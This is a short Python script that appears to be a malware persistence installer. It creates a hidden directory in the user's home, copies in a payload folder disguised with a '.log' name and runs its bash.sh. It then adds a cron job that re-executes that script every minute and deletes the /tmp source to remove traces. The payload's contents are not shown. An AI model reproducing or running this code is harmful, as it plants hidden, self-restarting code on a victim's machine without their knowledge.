import os
os.system('pip install python-crontab')
os.system('mkdir $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98')
os.system('cp -r /tmp/Unlockscreen/U6frt3A.log $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98' )
os.system('bash $HOME/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh')
from crontab import CronTab
user=os.environ["LOGNAME"]
#print("voici\n",user,'fin')
cron= CronTab(user=user)
script="bash "+os.environ["HOME"]+'/.bdedbfdbabcbafb56cd51926635d136055035e4dd9c7d1f5003af98/U6frt3A.log/bash.sh'
job = cron.new(command=script)
job.minute.every(1)
cron.write()
os.system('rm -rf /tmp/Unlockscreen')